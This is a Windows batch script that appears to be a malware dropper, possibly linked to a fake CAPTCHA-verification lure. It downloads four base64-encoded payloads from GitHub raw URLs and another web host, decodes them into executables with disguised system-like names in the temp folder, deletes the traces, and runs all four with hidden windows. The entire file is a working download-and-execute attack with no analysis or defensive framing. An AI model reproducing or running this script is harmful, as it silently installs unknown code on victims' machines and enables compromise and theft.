@echo off
setlocal enabledelayedexpansion

:: Configuration Section
set "url1=https://raw.githubusercontent.com/captcharequests/verify/refs/heads/main/x.txt"
set "url2=https://raw.githubusercontent.com/captcharequests/verify/refs/heads/main/tgr.txt"
set "url3=https://raw.githubusercontent.com/captcharequests/verify/refs/heads/main/qz.txt"
set "url4=https://alexbuckland.me/uploads/tgs.txt"

set "ext1=exe"
set "ext2=exe"
set "ext3=exe"
set "ext4=exe"

set "outputDir=%temp%\base64_files"
if not exist "%outputDir%" mkdir "%outputDir%"

set "outputFile1=%outputDir%\windll.!ext1!"
set "outputFile2=%outputDir%\Rundll.!ext2!"
set "outputFile3=%outputDir%\wintgs.!ext3!"
set "outputFile4=%outputDir%\runqlls.!ext4!"

:: Download and decode first file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url1%' -OutFile '%outputDir%\temp1.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp1.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile1%', [Convert]::FromBase64String($b64))"

:: Download and decode second file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url2%' -OutFile '%outputDir%\temp2.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp2.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile2%', [Convert]::FromBase64String($b64))"

:: Download and decode third file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url3%' -OutFile '%outputDir%\temp3.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp3.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile3%', [Convert]::FromBase64String($b64))"

:: Download and decode fourth file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url4%' -OutFile '%outputDir%\temp4.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp4.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile4%', [Convert]::FromBase64String($b64))"

:: Cleanup temp files
del "%outputDir%\temp1.txt" 2>nul
del "%outputDir%\temp2.txt" 2>nul
del "%outputDir%\temp3.txt" 2>nul
del "%outputDir%\temp4.txt" 2>nul

:: Execute files completely hidden
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile1%' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile2%' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile3%' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile4%' -WindowStyle Hidden"

exit
